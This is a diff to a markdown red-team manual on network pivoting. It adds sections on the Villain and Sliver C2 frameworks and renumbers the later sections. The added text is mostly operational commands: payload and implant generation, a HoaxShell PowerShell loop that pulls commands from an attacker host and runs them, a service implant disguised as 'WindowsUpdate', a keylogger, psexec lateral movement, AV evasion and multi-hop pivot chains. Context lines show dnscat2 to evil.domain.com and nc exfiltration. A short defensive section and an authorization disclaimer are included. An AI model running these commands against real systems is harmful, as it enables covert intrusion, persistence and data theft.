@@ -13,18 +13,20 @@ keywords:
   - chisel
   - ligolo-ng
   - havoc c2
+  - villain
+  - sliver
   - metasploit pivoting
   - gl0bal01
   - global01
 authors: [gl0bal01]
-tags: [pivoting]
+tags: [Pivoting]
 ---
 
 # Comprehensive Network Pivoting in Adversarial Operations: An Academic Reference Manual
 
 ## Abstract
 
-This comprehensive academic reference presents an exhaustive analysis of network pivoting methodologies, tools, and techniques employed in modern adversarial operations. We examine fifteen primary pivoting frameworks across multiple platforms, providing detailed implementation examples, operational security considerations, and advanced detection evasion techniques. This manual serves as both theoretical foundation and practical implementation guide for cybersecurity researchers and practitioners.
+This comprehensive academic reference presents an exhaustive analysis of network pivoting methodologies, tools, and techniques employed in modern adversarial operations. We examine seventeen primary pivoting frameworks across multiple platforms, providing detailed implementation examples, operational security considerations, and advanced detection evasion techniques. This manual serves as both theoretical foundation and practical implementation guide for cybersecurity researchers and practitioners.
 
 ## 1. Introduction
 
@@ -89,6 +91,8 @@ Each pivoting methodology is evaluated across seven critical dimensions:
 | Ligolo-ng | High | TCP/UDP | Cross | Medium | High | Medium | High |
 | Metasploit | Low | TCP | Cross | Low | Low | Medium | Low |
 | Havoc C2 | High | TCP/HTTP(S) | Cross | Medium | High | High | High |
+| Villain | High | TCP/HTTP(S) | Cross | Low | Medium | High | High |
+| Sliver | High | Multi | Cross | Medium | High | High | Very High |
 | Socat | Medium | TCP/UDP | *nix | High | Low | Low | Medium |
 | Netsh | Medium | TCP | Windows | Medium | Medium | High | Medium |
 | Plink | Medium | TCP | Windows | Low | Medium | High | Medium |
@@ -96,6 +100,11 @@ Each pivoting methodology is evaluated across seven critical dimensions:
 | reGeorg | High | HTTP(S) | Web | High | Low | Low | High |
 | Stunnel | High | TCP/TLS | Cross | Medium | Medium | High | High |
 | dnscat2 | Very High | DNS | Cross | High | Low | Medium | Very High |
+
+
+:::note Note
+Evaluation criteria are based on operational field experience, security research publications, and comparative analysis of tool capabilities in controlled environments. Ratings represent relative assessments under typical deployment scenarios and may vary based on specific implementation, configuration, and defensive posture of target networks.
+:::
 
 ### 1.4 Tool Selection Decision Framework
 
@@ -147,6 +156,10 @@ flowchart TD
     style P fill:#fff3e0
     style R fill:#f3e5f5
 ```
+
+:::note
+This decision framework presents a simplified selection process focusing on primary pivoting tools. Modern C2 frameworks like Villain and Sliver offer multi-protocol support and can be used across multiple paths in this flowchart. For example, Sliver supports HTTP/HTTPS, DNS, mTLS, and WireGuard protocols, while Villain excels in collaborative scenarios with HTTP/HTTPS tunneling. The framework prioritizes tool selection based on immediate operational constraints rather than comprehensive capability assessment.
+:::
 
 ## 2. SSH-Based Pivoting Methodologies
 
@@ -621,12 +634,338 @@ demon> session clone --session-id 1 --method tcp --host 192.168.1.200
 demon> pivot p2p --enable --port 6666 --peers "192.168.1.100:6666"
 ```
 
-## 7. Windows-Specific Pivoting Tools
+## 7. Villain Framework: Collaborative C2 with Session Sharing
+
+:::note
+Villain requires Python 3 and is available in Kali Linux repositories. Replace IP addresses, usernames, passwords, and port numbers with values appropriate to your environment. The collaborative features require multiple Villain instances running on different machines.
+:::
+
+Villain is a high-level stage 0/1 C2 framework that excels at managing multiple reverse TCP and HoaxShell-based shells while providing unique collaborative capabilities for team operations.
+
+### 7.1 Framework Installation and Setup
+
+```bash
+# Install from Kali repositories
+sudo apt install villain
+
+# Manual installation from source
+git clone https://github.com/t3l3machus/Villain
+cd Villain
+pip3 install -r requirements.txt
+
+# Start Villain server
+villain
+
+# Start with custom ports
+villain -p 65001 -x 8080 -n 4444 -f 8888
+
+# Start with SSL support for HoaxShell HTTPS
+villain -c cert.pem -k key.pem
+```
+
+### 7.2 Payload Generation and Management
+
+```bash
+# Generate Windows PowerShell payload
+Villain > generate os=windows lhost=192.168.1.100
+
+# Generate Linux payload
+Villain > generate os=linux lhost=192.168.1.100
+
+# Generate HoaxShell payload (HTTP)
+Villain > generate os=windows lhost=192.168.1.100 payload=hoaxshell
+
+# Generate HoaxShell HTTPS payload
+Villain > generate os=windows lhost=192.168.1.100 payload=hoaxshell-ssl
+
+# List all backdoor payloads
+Villain > backdoors
+
+# List active sessions
+Villain > sessions
+```
+
+### 7.3 Session Management and Interaction
+
+```bash
+# Connect to a session
+Villain > shell 1
+
+# Execute commands in pseudo-shell
+shell > whoami
+shell > ipconfig /all
+shell > netstat -an
+
+# Upload files via HTTP File Smuggler
+shell > upload /path/to/local/file.exe
+
+# Inject and execute scripts fileless
+shell > inject /path/to/script.ps1
+
+# Invoke ConPtyShell for fully interactive shell
+Villain > conptyshell 1
+
+# Exit without terminating sessions
+Villain > flee
+```
+
+### 7.4 Collaborative Features and Sibling Servers
+
+```bash
+# Connect to another Villain instance
+Villain > connect 192.168.1.200:65001
+
+# Share sessions with connected siblings
+Villain > share
+
+# Send messages to all connected siblings
+Villain > #Team message here
+
+# List connected sibling servers
+Villain > siblings
+
+# Disconnect from sibling
+Villain > disconnect 192.168.1.200
+```
+
+### 7.5 Advanced Villain Techniques
+
+```bash
+# Session persistence and metadata
+# Villain automatically stores session metadata
+# Allows re-establishment of HoaxShell sessions
+
+# Purge all session metadata
+Villain > purge
+
+# Custom obfuscation for AV evasion
+# Edit templates in /Core/payload_templates/
+# Replace with obfuscated versions
+
+# Background execution with compression
+villain -p 65001 --quiet --compress
+
+# Multi-handler configuration
+# config.yml example:
+handlers:
+  - port: 8080
+    type: http
+    auth: user:pass
+  - port: 443
+    type: https
+    cert: cert.pem
+    key: key.pem
+```
+
+### 7.6 HoaxShell Integration
+
+HoaxShell payloads use HTTP(S) to establish beacon-like reverse shells, making them particularly effective against restrictive firewalls:
+
+```powershell
+# Example HoaxShell payload structure (simplified)
+$s='192.168.1.100:8080';
+$i='session-id';
+while($true){
+    $c=(Invoke-WebRequest -UseBasicParsing -Uri $s -Headers @{"Authorization"=$i}).Content;
+    if($c -ne 'None') {
+        $r=Invoke-Expression $c 2>&1 | Out-String;
+        Invoke-WebRequest -Uri $s -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($r))
+    }
+    Start-Sleep -Seconds 0.8
+}
+```
+
+## 8. Sliver Framework: Modern Go-Based C2 with Advanced Pivoting
+
+:::note
+Sliver requires downloading the appropriate binary for your platform from the official releases. Replace all example IPs, domains, and file paths with your specific values. Session mode is required for pivoting and SOCKS proxy features.
+:::
+
+Sliver is an open-source, cross-platform C2 framework written in Go, providing fast, portable, and extensible capabilities for adversarial operations.
+
+### 8.1 Server Setup and Configuration
+
+```bash
+# Download and install Sliver
+wget https://github.com/BishopFox/sliver/releases/download/v1.5.x/sliver-server_linux
+chmod +x sliver-server_linux
+./sliver-server_linux
+
+# Start server in daemon mode
+./sliver-server_linux daemon
+
+# Configure multiplayer mode
+./sliver-server_linux operator --name operator1 --lhost 192.168.1.100 --lport 31337
+
+# Connect as operator
+./sliver-client_linux --config operator1.cfg
+```
+
+### 8.2 Listener Configuration
+
+```bash
+# Start HTTP listener
+sliver > http --domain example.com --lhost 192.168.1.100 --lport 80
+
+# Start HTTPS listener with custom certificate
+sliver > https --domain secure.example.com --lhost 192.168.1.100 --lport 443 --cert cert.pem --key key.pem
+
+# Start DNS listener
+sliver > dns --domains example.com --lhost 192.168.1.100
+
+# Start mutual TLS listener
+sliver > mtls --lhost 192.168.1.100 --lport 8888
+
+# Start WireGuard listener
+sliver > wg --lhost 192.168.1.100 --lport 51820
+
+# List active listeners
+sliver > jobs
+```
+
+### 8.3 Implant Generation
+
+```bash
+# Generate session implant (interactive)
+sliver > generate --http example.com --os windows --arch amd64 --format exe
+
+# Generate beacon implant (callback intervals)
+sliver > generate beacon --http example.com --os windows --arch amd64 --seconds 60 --jitter 10
+
+# Generate staged payload
+sliver > generate stager --http example.com --os windows --arch amd64 --format shellcode
+
+# Generate implant with custom settings
+sliver > generate --http example.com --os linux --arch amd64 --name "custom-implant" --debug --skip-symbols
+
+# Service implant for persistence
+sliver > generate --http example.com --os windows --format service --service-name "WindowsUpdate"
+```
+
+### 8.4 Pivoting and Network Tunneling
+
+Sliver session implants allow operators to create SOCKS5 proxies and pivots for tunneling traffic through compromised hosts:
+
+```bash
+# Select session for pivoting
+sliver > use [session-id]
+
+# Start SOCKS5 proxy
+sliver (session) > socks5 start --host 127.0.0.1 --port 1080
+
+# List active SOCKS proxies
+sliver > socks5
+
+# Stop SOCKS proxy
+sliver (session) > socks5 stop -i [proxy-id]
+
+# Port forwarding
+sliver (session) > portfwd add --remote 192.168.2.100:3389 --local :3389
+
+# List port forwards
+sliver (session) > portfwd
+
+# Create pivot listener
+sliver (session) > pivots tcp --bind 192.168.2.100:9090
+
+# Generate pivot implant
+sliver > generate --tcp-pivot 192.168.2.100:9090
+```
+
+### 8.5 Advanced Sliver Operations
+
+```bash
+# Process injection and migration
+sliver (session) > migrate [pid]
+
+# Execute .NET assembly in memory
+sliver (session) > execute-assembly /path/to/assembly.exe
+
+# Load and execute BOF (Beacon Object File)
+sliver (session) > bof /path/to/bof.o
+
+# Screenshot capture
+sliver (session) > screenshot
+
+# Keylogger
+sliver (session) > keylogger start
+sliver (session) > keylogger dump
+
+# Token manipulation
+sliver (session) > impersonate [username]
+
+# Lateral movement via psexec
+sliver (session) > psexec --host 192.168.2.101 --service-name "UpdateService" --service-desc "Windows Update"
+```
+
+### 8.6 Beacon Management
+
+Beacons check in with the server at configurable intervals, making them less noisy than session implants:
+
+```bash
+# Interact with beacon
+sliver > use [beacon-id]
+
+# Check beacon tasks
+sliver (beacon) > tasks
+
+# Fetch task results
+sliver (beacon) > tasks fetch [task-id]
+
+# Reconfigure beacon
+sliver (beacon) > reconfig --interval 120 --jitter 30
+
+# Execute commands
+sliver (beacon) > execute whoami
+sliver (beacon) > shell "net user"
+```
+
+### 8.7 Detection Evasion Features
+
+```bash
+# Traffic encryption (built-in)
+# All C2 traffic encrypted independently of transport protocol
+
+# Canary domains for sandbox detection
+sliver > generate --http example.com --canary google.com,microsoft.com
+
+# Custom obfuscation
+sliver > generate --http example.com --os windows --obfuscate
+
+# Traffic profiles
+sliver > profiles new --name "chrome" --format http
+sliver > profiles set-header "chrome" "User-Agent" "Mozilla/5.0 Chrome/91.0"
+```
+
+### 8.8 Multi-Hop Pivot Chains
+
+Pivots can be arbitrarily nested, allowing traffic to route through multiple compromised hosts:
+
+```bash
+# Establish first pivot
+sliver > use session-1
+sliver (session-1) > pivots tcp --bind 10.10.10.100:8888
+
+# Generate implant for second hop
+sliver > generate --tcp-pivot 10.10.10.100:8888 --name "hop2"
+
+# After second implant connects, create another pivot
+sliver > use session-2
+sliver (session-2) > pivots tcp --bind 172.16.1.50:9999
+
+# Generate implant for third hop
+sliver > generate --tcp-pivot 172.16.1.50:9999 --name "hop3"
+
+# Result: Attacker → Session-1 → Session-2 → Session-3
+```
+
+## 9. Windows-Specific Pivoting Tools
+
 :::note
 These sections assume you have administrative privileges on the Windows host. Substitute IP addresses, ports, usernames, and file paths as required by your target environment. Ensure all binaries (e.g., Plink, PowerShell scripts) are accessible on the system.
 :::
 
-### 7.1 Netsh Port Forwarding
+### 9.1 Netsh Port Forwarding
 
 Windows netsh provides native port forwarding capabilities without requiring additional tools:
 
@@ -653,7 +992,7 @@ netsh interface portproxy reset
 netsh interface portproxy add v4tov4 listenport=443 listenaddress=192.168.1.100 connectport=443 connectaddress=10.0.0.100
 ```
 
-### 7.2 Plink (PuTTY Link) Implementation
+### 9.2 Plink (PuTTY Link) Implementation
 
 Plink provides command-line SSH connectivity for Windows environments:
 
@@ -680,7 +1019,8 @@ plink.exe -load "pivot_session" -D 9050 -N
 plink.exe -ssh -proxycmd "connect.exe -H proxy:8080 %host %port" user@target
 ```
 
-### 7.3 PowerShell-Based Pivoting
+### 9.3 PowerShell-Based Pivoting
+
 :::note
 The following PowerShell/C# code provides a framework for implementing a SOCKS5 proxy server. The actual SOCKS5 protocol logic (handling client negotiation and relaying) must be implemented by the user. This is provided for reference; a complete implementation is left as an exercise for advanced readers. For full details, refer to RFC 1928.
 :::
@@ -734,11 +1074,13 @@ Add-Type -TypeDefinition $code
 [SocksProxy]::Start(1080)
 ```
 
-## 8. Cross-Platform Tunneling Solutions
+## 10. Cross-Platform Tunneling Solutions
+
 :::note
 All examples in this section assume you have downloaded or cloned the respective tool repositories (e.g., rpivot, reGeorg, stunnel, dnscat2) and fulfilled any dependencies. Substitute IP addresses, script paths, and ports to fit your scenario.
 :::
-### 8.1 rpivot: HTTP-Based Tunneling
+
+### 10.1 rpivot: HTTP-Based Tunneling
 
 rpivot provides HTTP/HTTPS tunneling with SOCKS proxy capabilities:
 
@@ -759,7 +1101,7 @@ python rpivot_client.py --server-ip attacker_ip --server-port 9999 --user-agent 
 python rpivot_client.py --server-ip attacker_ip --server-port 9999 --proxy proxy_host:8080
 ```
 
-### 8.2 reGeorg: Web Application Tunneling
+### 10.2 reGeorg: Web Application Tunneling
 
 reGeorg creates tunnels through web application servers:
 
@@ -777,7 +1119,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://target/tunnel.php -H "Cookie: PHPS
 python reGeorgSocksProxy.py -p 8080 -u http://target/tunnel.php -H "User-Agent: Custom" -H "X-Forwarded-For: 127.0.0.1"
 ```
 
-### 8.3 Stunnel: TLS Encryption Wrapper
+### 10.3 Stunnel: TLS Encryption Wrapper
 
 Stunnel provides TLS encryption for arbitrary protocols:
 
@@ -795,7 +1137,7 @@ accept = 8080
 connect = server_ip:443
 ```
 
-### 8.4 dnscat2: DNS Tunneling
+### 10.4 dnscat2: DNS Tunneling
 
 dnscat2 provides covert communication through DNS queries:
 
@@ -814,13 +1156,15 @@ ruby dnscat2.rb --security=open evil.domain.com
 ./dnscat2 --secret=password evil.domain.com
 ```
 
-## 9. Socat: Swiss Army Knife of Network Relays
+## 11. Socat: Swiss Army Knife of Network Relays
+
 :::note
 Socat must be installed on both source and destination hosts. Replace port numbers, interface addresses, and file paths as needed for your environment.
 :::
+
 Socat provides bidirectional data relay capabilities with extensive protocol support:
 
-### 9.1 Basic Relay Configurations
+### 11.1 Basic Relay Configurations
 
 ```bash
 # TCP port forwarding
@@ -839,7 +1183,7 @@ socat -d -d TCP-LISTEN:8080,fork TCP:internal_server:80
 socat TCP-LISTEN:8080,fork,max-children=10 TCP:internal_server:80
 ```
 
-### 9.2 Encrypted Tunneling
+### 11.2 Encrypted Tunneling
 
 ```bash
 # SSL/TLS server
@@ -855,7 +1199,7 @@ socat OPENSSL-LISTEN:443,cert=server.pem,cafile=ca.pem,fork TCP:internal_server:
 socat OPENSSL-LISTEN:443,cert=server.pem,cipher=HIGH,fork TCP:internal_server:80
 ```
 
-### 9.3 Advanced Socat Implementations
+### 11.3 Advanced Socat Implementations
 
 ```bash
 # HTTP proxy relay
@@ -874,13 +1218,15 @@ socat TCP-LISTEN:2001,fork /dev/ttyS0,raw,echo=0
 socat TCP-LISTEN:8080,fork UNIX-CONNECT:/var/run/service.sock
 ```
 
-## 10. Proxychains: Transparent Proxy Integration
+## 12. Proxychains: Transparent Proxy Integration
+
 :::note
 Proxychains must be installed on the system where you intend to tunnel applications. Edit the proxychains configuration files to reflect the actual proxy endpoints and chains you wish to use.
 :::
+
 Proxychains enables transparent proxy chain integration for arbitrary applications:
 
-### 10.1 Configuration Management
+### 12.1 Configuration Management
 
 ```bash
 # /etc/proxychains.conf or ~/.proxychains/proxychains.conf
@@ -895,7 +1241,7 @@ http 127.0.0.1 8080
 socks4 192.168.1.100 1080
 ```
 
-### 10.2 Chain Configuration Types
+### 12.2 Chain Configuration Types
 
 ```bash
 # Dynamic chain (uses only working proxies)
@@ -908,7 +1254,7 @@ strict_chain
 random_chain
 ```
 
-### 10.3 Application Integration
+### 12.3 Application Integration
 
 ```bash
 # Network scanning through proxy chain
@@ -930,12 +1276,13 @@ proxychains firefox
 proxychains ./custom_tool --target internal_host
 ```
 
-## 11. Advanced Pivot Chaining Methodologies
+## 13. Advanced Pivot Chaining Methodologies
+
 :::note
 The following examples combine multiple pivoting techniques and assume prior establishment of each tunnel or session as described in the previous sections. Adjust hostnames, IPs, ports, and tool invocations for your topology.
 :::
 
-### 11.1 Multi-Hop Architecture Design
+### 13.1 Multi-Hop Architecture Design
 
 Effective pivot chaining requires systematic network mapping and route optimization across multiple security boundaries:
 
@@ -992,7 +1339,7 @@ sequenceDiagram
 4. **Route Optimization**: Configure efficient traffic routing
 5. **Persistence**: Maintain reliable communication channels
 
-### 11.2 Hierarchical Routing Implementation
+### 13.2 Hierarchical Routing Implementation
 
 ```bash
 # Primary route through most stable pivot
@@ -1008,7 +1355,7 @@ ip route add 10.10.0.0/16 via 192.168.1.102 dev eth0 metric 20
 ip route add 10.10.0.0/16 nexthop via 192.168.1.100 weight 1 nexthop via 192.168.1.101 weight 1
 ```
 
-### 11.3 Cascade Tunneling Example
+### 13.3 Cascade Tunneling Example
 
 ```bash
 # Hop 1: SSH tunnel to DMZ host
@@ -1024,11 +1371,13 @@ proxychains ./agent -connect deep_internal:11601
 proxychains nmap -sT critical_network_range
 ```
 
-## 12. Detection Evasion and Operational Security
+## 14. Detection Evasion and Operational Security
+
 :::note
 Evasion strategies assume prior knowledge of defensive monitoring systems and network policies in your environment. Adapt timing, protocol, and behavioral parameters to maximize stealth in your particular context.
 :::
-### 12.1 Operational Timeline and Evasion Strategy
+
+### 14.1 Operational Timeline and Evasion Strategy
 
 The following timeline illustrates optimal timing and sequencing of evasion techniques throughout an operation:
 
@@ -1069,7 +1418,7 @@ gantt
     Covert Transfer      :exfil3, after exfil2, 10:00
 ```
 
-### 12.2 Traffic Analysis Evasion
+### 14.2 Traffic Analysis Evasion
 
 #### Protocol Mimicry Techniques:
 
@@ -1110,7 +1459,7 @@ tc class add dev eth0 parent 1:1 classid 1:12 htb rate 1mbit ceil 2mbit
 pv -L 1024 < largefile.dat | nc target_host 443
 ```
 
-### 12.2 Behavioral Analysis Evasion
+### 14.2 Behavioral Analysis Evasion
 
 #### Credential Management:
 
@@ -1151,7 +1500,7 @@ public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandl
 Add-Type -MemberDefinition $code -Name Win32 -Namespace Win32Functions
 ```
 
-### 12.3 Memory-Only Operations
+### 14.3 Memory-Only Operations
 
 #### Fileless Agent Deployment:
 
@@ -1188,7 +1537,7 @@ int main() {
 }
 ```
 
-### 12.4 Advanced Evasion Techniques
+### 14.4 Advanced Evasion Techniques
 
 #### Domain Fronting:
 
@@ -1220,11 +1569,13 @@ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 \
     -subj "/C=US/ST=CA/L=San Francisco/O=Legitimate Corp/CN=*.legitimate.com"
 ```
 
-## 13. Platform-Specific Implementation Considerations
+## 15. Platform-Specific Implementation Considerations
+
 :::note
 Adapt scripts, service definitions, and persistence mechanisms to your platform (Linux, Windows, container, or cloud). Substitute example IPs, file paths, and user names as required.
 :::
-### 13.1 Linux-Specific Techniques
+
+### 15.1 Linux-Specific Techniques
 
 ```bash
 # iptables-based port forwarding
@@ -1248,7 +1599,7 @@ WantedBy=multi-user.target
 EOF
 ```
 
-### 13.2 Windows-Specific Implementations
+### 15.2 Windows-Specific Implementations
 
 ```cmd
 REM Registry-based persistence
@@ -1259,7 +1610,7 @@ sc create TunnelService binPath= "C:\Windows\System32\plink.exe -ssh -D 9050 -N 
 sc config TunnelService start= auto
 ```
 
-### 13.3 Container and Cloud Environments
+### 15.3 Container and Cloud Environments
 
 ```bash
 # Docker container pivoting
@@ -1272,11 +1623,13 @@ kubectl port-forward pod/pivot-pod 8080:80
 curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/
 ```
 
-## 14. Monitoring and Defensive Considerations
+## 16. Monitoring and Defensive Considerations
+
 :::note
 Defensive strategies and detection patterns provided here are examples; always tune IDS/IPS and SIEM rules to your organizational network profile and risk posture.
 :::
-### 14.1 Detection Signatures
+
+### 16.1 Detection Signatures
 
 Network defenders should monitor for the following indicators:
 
@@ -1292,7 +1645,7 @@ Network defenders should monitor for the following indicators:
 - DNS queries to unusual domains or with high frequency
 - TLS connections to self-signed or suspicious certificates
 
-### 14.2 Defensive Countermeasures
+### 16.2 Defensive Countermeasures
 
 ```bash
 # Network segmentation enforcement
@@ -1305,11 +1658,13 @@ snort -c /etc/snort/snort.conf -i eth0
 netstat -antlp | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr
 ```
 
-## 15. Legal and Ethical Considerations
+## 17. Legal and Ethical Considerations
+
 :::note
 All activities must be performed with explicit written authorization. Always maintain thorough documentation and comply with all relevant legal and ethical standards for your jurisdiction and engagement.
 :::
-### 15.1 Authorization Requirements
+
+### 17.1 Authorization Requirements
 
 All pivoting techniques described in this manual must only be employed within the scope of:
 - Authorized penetration testing engagements
@@ -1317,7 +1672,7 @@ All pivoting techniques described in this manual must only be employed within th
 - Security research in controlled environments
 - Defensive security training and education
 
-### 15.2 Documentation Requirements
+### 17.2 Documentation Requirements
 
 Comprehensive documentation must include:
 - Scope of testing authorization
@@ -1326,11 +1681,11 @@ Comprehensive documentation must include:
 - Timeline of pivoting activities
 - Data accessed or modified during testing
 
-## 16. Conclusion
+## 18. Conclusion
 
 This comprehensive reference manual provides an exhaustive analysis of network pivoting methodologies across multiple platforms and use cases. The techniques described represent the current state-of-the-art in adversarial network traversal, providing cybersecurity professionals with the knowledge necessary to both implement and defend against sophisticated pivoting attacks.
 
-The evolution of pivoting tools toward more sophisticated evasion capabilities, exemplified by frameworks such as Ligolo-ng and Havoc C2, demonstrates the ongoing arms race between offensive and defensive capabilities. Future research should focus on machine learning-based traffic analysis evasion, quantum-resistant encryption for long-term operations, and integration with cloud-native architectures.
+The evolution of pivoting tools toward more sophisticated evasion capabilities, exemplified by frameworks such as Ligolo-ng, Havoc C2, Villain, and Sliver, demonstrates the ongoing arms race between offensive and defensive capabilities. Future research should focus on machine learning-based traffic analysis evasion, quantum-resistant encryption for long-term operations, and integration with cloud-native architectures.
 
 Security practitioners must balance the offensive capabilities described herein with robust defensive measures, comprehensive monitoring, and adherence to ethical guidelines to ensure the responsible advancement of cybersecurity knowledge and capabilities.
 
@@ -1343,7 +1698,10 @@ Security practitioners must balance the offensive capabilities described herein 
 5. [Chisel Project Repository.](https://github.com/jpillora/chisel)
 6. [Ligolo-ng Technical Documentation.](https://github.com/nicocha30/ligolo-ng)
 7. [Havoc C2 Framework.](https://github.com/HavocFramework/Havoc)
-8. [OpenSSH Manual Pages.](https://www.openssh.com/manual.html)
-9. [HideandSec.](https://hideandsec.sh/books/cheatsheets-82c/page/pivoting)
-10. [NIST Special Publication 800-115: Technical Guide to Information Security Testing and Assessment.](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf)
-11. [OWASP Testing Guide v4.0: Web Application Security Testing.](https://owasp.org/www-project-web-security-testing-guide/)
+8. [Villain Framework Repository.](https://github.com/t3l3machus/Villain)
+9. [Sliver Framework Documentation.](https://sliver.sh/)
+10. [OpenSSH Manual Pages.](https://www.openssh.com/manual.html)
+11. [Pivoting. HideandSec.](https://hideandsec.sh/books/cheatsheets-82c/page/pivoting)
+12. [NIST Special Publication 800-115: Technical Guide to Information Security Testing and Assessment.](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf)
+13. [OWASP Testing Guide v4.0: Web Application Security Testing.](https://owasp.org/www-project-web-security-testing-guide/)
+14. [BishopFox Sliver Wiki: Pivots.](https://github.com/BishopFox/sliver/wiki/Pivots)
